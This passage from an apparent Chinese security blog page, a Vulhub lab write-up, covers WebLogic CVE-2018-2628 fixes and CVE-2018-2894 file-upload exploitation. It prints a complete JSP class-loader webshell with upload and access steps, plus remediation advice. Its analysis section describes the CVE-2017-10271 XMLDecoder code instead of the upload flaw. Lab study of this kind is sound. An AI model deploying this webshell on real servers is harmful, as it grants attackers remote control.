+<h2 id="4-漏洞修复-1"><a href="#4-漏洞修复-1" class="headerlink" title="4 漏洞修复"></a>4 漏洞修复</h2><ol>
+<li>此漏洞产生于Weblogic T3服务，当开放Weblogic控制台端口（默认为7001端口）时，T3服务会默认开启。关闭T3服务，或控制T3服务的访问权限，能防护该漏洞。</li>
+</ol>
+<blockquote>
+<p>a）进入Weblogic控制台，在base_domain的配置页面中，进入“安全”选项卡页面，点击“筛选器”，进入连接筛选器配置。</p>
+<p>b）在连接筛选器中输入：weblogic.security.net.ConnectionFilterImpl，在连接筛选器规则中输入：127.0.0.1 * * allow t3 t3s，0.0.0.0&#x2F;0 * * deny t3 t3s(t3和t3s协议的所有端口只允许本地访问)。</p>
+<p>c）保存后需重新启动，规则方可生效。</p>
+</blockquote>
+<ol start="2">
+<li>更新Oracle官方发布的最新补丁，同时升级jdk至1.7.0.21以上版本。</li>
+<li>在weblogic.utils.io.oif.WebLogicFilterConfig的黑名单DEFAULT_BLACKLIST_CLASS中添加”java.rmi.server.RemoteObjectInvocationHandler”，编译并更新swlclient.jar、wlthint3client.jar这两个用到该类的包。</li>
+</ol>
+<h1 id="Weblogic-任意文件上传漏洞（CVE-2018-2894）"><a href="#Weblogic-任意文件上传漏洞（CVE-2018-2894）" class="headerlink" title="Weblogic 任意文件上传漏洞（CVE-2018-2894）"></a>Weblogic 任意文件上传漏洞（CVE-2018-2894）</h1><h2 id="1-简介-2"><a href="#1-简介-2" class="headerlink" title="1.简介"></a>1.简介</h2><p>Oracle 7月更新中，修复了Weblogic Web Service Test Page中一处任意文件上传漏洞，Web Service Test Page 在”生产模式”下默认不开启，所以该漏洞有一定限制。利用该漏洞，可以上传任意jsp文件，进而获取服务器权限。</p>
+<p>Oracle Fusion Middleware的Oracle WebLogic Server组件（子组件：WLS - Web Services）存在安全缺陷，未经身份验证的攻击者可通过HTTP协议网络访问利用该漏洞，从而完全控制Oracle WebLogic Server。</p>
+<h2 id="2-漏洞复现-2"><a href="#2-漏洞复现-2" class="headerlink" title="2.漏洞复现"></a>2.漏洞复现</h2><p>执行如下命令，启动weblogic 12.2.1.3：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>环境启动后，访问<code>http://your-ip:7001/console</code>，即可看到后台登录页面。</p>
+<p><img src="/2025/09/23/Vulhub%E9%9D%B6%E5%9C%BA/image-20251109172233714.png" alt="image-20251109172233714"></p>
+<p>执行<code>docker compose logs | grep password</code>可查看管理员账号密码。</p>
+<p><img src="/2025/09/23/Vulhub%E9%9D%B6%E5%9C%BA/image-20251109172147147.png" alt="image-20251109172147147"></p>
+<p>登录后台页面，点击<code>base_domain</code>的配置，在”高级”中开启”启用 Web 服务测试页”选项：</p>
+<p><img src="/2025/09/23/Vulhub%E9%9D%B6%E5%9C%BA/image-20251109172722816.png" alt="image-20251109172722816"></p>
+<p><img src="/2025/09/23/Vulhub%E9%9D%B6%E5%9C%BA/image-20251109173218623.png" alt="image-20251109173218623"></p>
+<p>访问<code>http://your-ip:7001/ws_utc/config.do</code>，设置Work Home Dir为<code>/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</code>。我将目录设置为<code>ws_utc</code>应用的静态文件css目录，访问这个目录是无需权限的，这一点很重要。</p>
+<p><img src="/2025/09/23/Vulhub%E9%9D%B6%E5%9C%BA/image-20251109174752756.png" alt="image-20251109174752756"></p>
+<p>然后点击安全 -&gt; 增加，上传名字和密码可以随意设置，上传jsp木马文件（登录密码为fafa）；</p>
+<blockquote>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">U</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">        U(ClassLoader c) &#123;</span><br><span class="line">            <span class="built_in">super</span>(c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> Class <span class="title function_">g</span><span class="params">(<span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.defineClass(b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] base64Decode(String str) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> (<span class="type">byte</span>[]) clazz.getMethod(<span class="string">&quot;decodeBuffer&quot;</span>, String.class).invoke(clazz.newInstance(), str);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">decoder</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getDecoder&quot;</span>).invoke(<span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">return</span> (<span class="type">byte</span>[]) decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>, String.class).invoke(decoder, str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">cls</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;fafa&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (cls != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">U</span>(<span class="built_in">this</span>.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></blockquote>
+<p><img src="/2025/09/23/Vulhub%E9%9D%B6%E5%9C%BA/image-20251109173743592.png" alt="image-20251109173743592"></p>
+<p>上传后，查看返回的数据包，其中有时间戳：</p>
+<p><img src="/2025/09/23/Vulhub%E9%9D%B6%E5%9C%BA/image-20251109174824245.png" alt="image-20251109174824245"></p>
+<p>然后访问<code>http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]</code>，即可执行webshell：</p>
+<p><a target="_blank" rel="noopener" href="http://your-ip:7001/ws_utc/css/config/keystore/1762681608180_webshell.jsp">http://your-ip:7001/ws_utc/css/config/keystore/1762681608180_webshell.jsp</a></p>
+<p><img src="/2025/09/23/Vulhub%E9%9D%B6%E5%9C%BA/image-20251109171526856.png" alt="image-20251109171526856"></p>
+<h2 id="3-漏洞分析-2"><a href="#3-漏洞分析-2" class="headerlink" title="3 漏洞分析"></a>3 漏洞分析</h2><p>此次漏洞出现在wls-wsat.war中，此组件使用了weblogic自带的webservices处理程序来处理SOAP请求。</p>
+<p>首先看到weblogic.wsee.jaxws.workcontext.WorkContextServerTube类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> NextAction <span class="title function_">processRequest</span><span class="params">(Packet var1)</span> &#123;</span><br><span class="line">   <span class="built_in">this</span>.isUseOldFormat = <span class="literal">false</span>;</span><br><span class="line">   <span class="keyword">if</span>(var1.getMessage() != <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="type">HeaderList</span> <span class="variable">var2</span> <span class="operator">=</span> var1.getMessage().getHeaders();</span><br><span class="line">      <span class="type">Header</span> <span class="variable">var3</span> <span class="operator">=</span> var2.get(WorkAreaConstants.WORK_AREA_HEADER, <span class="literal">true</span>);</span><br><span class="line">      <span class="keyword">if</span>(var3 != <span class="literal">null</span>) &#123;</span><br><span class="line">         <span class="built_in">this</span>.readHeaderOld(var3);<span class="comment">//如果存在老版本头部则进入危险的反序列话过程</span></span><br><span class="line">         <span class="built_in">this</span>.isUseOldFormat = <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="type">Header</span> <span class="variable">var4</span> <span class="operator">=</span> var2.get(<span class="built_in">this</span>.JAX_WS_WORK_AREA_HEADER, <span class="literal">true</span>);</span><br><span class="line">      <span class="keyword">if</span>(var4 != <span class="literal">null</span>) &#123;</span><br><span class="line">         <span class="built_in">this</span>.readHeader(var4);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">readHeaderOld</span><span class="params">(Header var1)</span> &#123;</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="comment">/* 所有通过var5写入的XML数据会直接输出到var4的字节数组中 */</span></span><br><span class="line">      <span class="comment">/* 1. 从XMLStreamReader var2读取原始XML数据*/</span></span><br><span class="line">      <span class="comment">/* 2. 通过XMLStreamWriter var5将结构化XML序列化为字节流写入缓冲区var4*/</span></span><br><span class="line">      <span class="comment">/* 3. 创建了一个 WorkContextXmlInputAdapter 适配器对象，它包装了 var4 中的 XML 数据*/</span></span><br><span class="line">      <span class="type">XMLStreamReader</span> <span class="variable">var2</span> <span class="operator">=</span> var1.readHeader();</span><br><span class="line">      var2.nextTag();</span><br><span class="line">      var2.nextTag();</span><br><span class="line">      <span class="type">XMLStreamReaderToXMLStreamWriter</span> <span class="variable">var3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XMLStreamReaderToXMLStreamWriter</span>();</span><br><span class="line">      <span class="type">ByteArrayOutputStream</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">      <span class="type">XMLStreamWriter</span> <span class="variable">var5</span> <span class="operator">=</span> XMLStreamWriterFactory.create(var4);</span><br><span class="line">      var3.bridge(var2, var5);</span><br><span class="line">      var5.close();</span><br><span class="line">      <span class="type">WorkContextXmlInputAdapter</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WorkContextXmlInputAdapter</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(var4.toByteArray()));</span><br><span class="line">      <span class="built_in">this</span>.receive(var6);<span class="comment">//触发反序列化 - 不停跟进就会发现调用了xmlDecoder.readObject方法</span></span><br><span class="line">   &#125; <span class="keyword">catch</span> (XMLStreamException var7) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">WebServiceException</span>(var7);</span><br><span class="line">   &#125; <span class="keyword">catch</span> (IOException var8) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">WebServiceException</span>(var8);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="4-漏洞修复-2"><a href="#4-漏洞修复-2" class="headerlink" title="4 漏洞修复"></a>4 漏洞修复</h2><p>启动生产模式</p>
+<p>编辑domain路径下的setDomainEnv.cmd文件，将set PRODUCTION_MODE&#x3D; 更改为 set PRODUCTION_MODE&#x3D;true C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain\bin\setDomainEnv.cmd</p>
+<p>目前(2019&#x2F;06&#x2F;07) 生产模式下 已取消这两处上传文件的地方。</p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.jpg" alt="wuyaxiao 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="wuyaxiao 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/09/23/DVWA%E9%9D%B6%E5%9C%BA/" rel="prev" title="">
+      <i class="fa fa-chevron-left"></i> 
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2025/10/16/%E8%8F%9C%E7%8B%97%E6%9D%AF/" rel="next" title="">
+       <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+            
+    
+  
+
+  <!-- 应使用 elif 而不是 else if -->  
+  <div class="comments" id="comments">  
+    
+  <script src="https://utteranc.es/client.js"
+    repo="wuyaxiao/wuyaxiao.github.io"
+    issue-term="title"
+    theme="github-light"
+    crossorigin="anonymous"
+    async>
+  </script>
+  
+  </div>  
+  
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="nav-number">1.</span> <span class="nav-text">相关知识点</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">2.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Weblogic-10-3-6-%E2%80%98wls-wsat%E2%80%99-XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-10271%EF%BC%89"><span class="nav-number">3.</span> <span class="nav-text">Weblogic &lt; 10.3.6 ‘wls-wsat’ XMLDecoder 反序列化漏洞（CVE-2017-10271）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E7%AE%80%E4%BB%8B"><span class="nav-number">3.1.</span> <span class="nav-text">1.简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-number">3.2.</span> <span class="nav-text">2.漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">3.2.1.</span> <span class="nav-text">2.1 环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81"><span class="nav-number">3.2.2.</span> <span class="nav-text">2.2 漏洞验证</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">3.3.</span> <span class="nav-text">3 漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="nav-number">3.4.</span> <span class="nav-text">4 漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Weblogic-WLS-Core-Components-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-2628%EF%BC%89"><span class="nav-number">4.</span> <span class="nav-text">Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E7%AE%80%E4%BB%8B-1"><span class="nav-number">4.1.</span> <span class="nav-text">1.简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-1"><span class="nav-number">4.2.</span> <span class="nav-text">2.漏洞复现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="nav-number">4.3.</span> <span class="nav-text">3 漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-1"><span class="nav-number">4.4.</span> <span class="nav-text">4 漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Weblogic-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-2894%EF%BC%89"><span class="nav-number">5.</span> <span class="nav-text">Weblogic 任意文件上传漏洞（CVE-2018-2894）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E7%AE%80%E4%BB%8B-2"><span class="nav-number">5.1.</span> <span class="nav-text">1.简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2"><span class="nav-number">5.2.</span> <span class="nav-text">2.漏洞复现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-2"><span class="nav-number">5.3.</span> <span class="nav-text">3 漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-2"><span class="nav-number">5.4.</span> <span class="nav-text">4 漏洞修复</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">wuyaxiao</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="fa fa-user">
+  </span>
+  <span class="author" itemprop="copyrightHolder">wuyaxiao</span>
+</div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/medium-zoom@1/dist/medium-zoom.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
